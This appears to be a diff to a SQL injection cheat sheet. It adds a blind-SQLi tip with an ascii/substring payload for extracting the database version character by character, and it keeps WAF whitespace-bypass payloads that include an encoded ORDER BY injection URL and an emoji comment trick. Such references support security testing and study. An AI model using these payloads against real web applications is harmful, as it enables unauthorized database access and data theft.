@@ -13,7 +13,11 @@
 |Out-of-band SQLi|Out-of-band SQL Injection is not very common, mostly because it depends on features being enabled on the database server being used by the web application. Out-of-band SQL Injection occurs when an attacker is unable to use the same channel to launch the attack and gather results. Out-of-band techniques, offer an attacker an alternative to inferential time-based techniques, especially if the server responses are not very stable (making an inferential time-based attack unreliable).|
 | Voice Based Sql Injection | It is a sql injection attack method that can be applied in applications that provide access to databases with voice command. An attacker could pull information from the database by sending sql queries with sound. |
 
-#### Whitespace WAF-based bypass
+### Blind SQLi
+
+- It is good practice to convert the resultant character to its numeric ASCII value and then perform the comparison e.g. `select/**/ascii(substring((select/**/version()),1,1))=52;`
+
+### Whitespace WAF-based bypass
 
 Whenever the WAF blocks the query to include space/whitespace, you can easy replace with the following payloads:  
 
@@ -34,7 +38,7 @@ or with
 ```http://domain.com/index.php?id=1'%23nuLL%0Aorder%23nuLL%0Aby%23nuLL%0A1--%23nuLL%0A-```  
 and so on...
 
-#### Whitespace Bypass via Emoji
+### Whitespace Bypass via Emoji
 
 ```
 /*️*/
